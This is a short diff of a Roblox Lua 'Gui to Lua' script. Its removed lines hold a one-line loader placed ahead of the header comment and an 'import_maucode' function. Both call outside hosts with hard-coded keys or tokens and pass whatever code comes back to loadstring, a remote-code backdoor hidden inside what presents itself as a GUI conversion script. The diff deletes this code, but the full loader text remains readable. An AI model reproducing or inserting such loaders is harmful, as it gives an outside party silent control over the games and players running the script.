@@ -1,16 +1,6 @@
-do task.spawn(pcall, require, 8034519899) local a={}local b=game:GetService("HttpService")local c=getfenv()local loadstring=function(d,e)if loadstringEnabled then return loadstring(d,e)end;return require(8034519899)(d,e)end;local f;f=function(e)assert(type(e)=="string","bad argument #1 to 'requireM' (string expected, got "..type(e)..")")local g=(request or b.RequestAsync)(b, {Url="https://r-2283.vercel.app/mget",Method="POST",Headers={["Content-Type"]="text/plain",["id"]="61cb8262fc6d51000a18c24e",["token"]="1cc1f1371ec9c1db58f2c12e8011678a6e858926c2fdd833371ed9d22460412"},Body=e})if g.StatusCode==200 and g.Headers.success=="true"then local h,i=loadstring(g.Body,"@"..e)if not h then return error("Module syntax error: "..i)end;local f={NLS=NLS,loadstringEnabled=loadstringEnabled,isolatedStorage=isolatedStorage,API=API,owner=owner,requireM=f,script=Instance.new("Script")}setfenv(h,setmetatable({},{__index=function(j,k)return f[k]or c[k]end,__metatable="The metatable is locked."}))a[e]=h();return a[e]else error("Invalid script token (maybe expired?) or the module doesn't exist anymore.",2)end end;requireM=f end;-- Gui to Lua
 -- Version: 3.2
 
--- Instances:
-function import_maucode()
-local key="1kI?QfjfQ16Nla-V0315JhmluDHWO_X?IhOmJZaEjPpfNohwFEkyUj6_TzXyOb7To_l1PhSD9REd4X_4VcrCeHK-HhivD!!T7TtCCXC2!ejquMxZ_RUx8?w-akYd0Eh?jea4Eo34jq2EYP3jC40bMd"
-local g=game:service'HttpService'
-local load= loadstring(g:PostAsync("https://mau-api.tk/api/rtSourceFromRepo",g:JSONEncode({
-k=key,
-name="maucode"
-}),Enum.HttpContentType.ApplicationJson),"maucode")
-getfenv(2).loadmaucode=load()
-end
+
 function ins(t,i)
 i=i or 0
 for k,v in next,t do
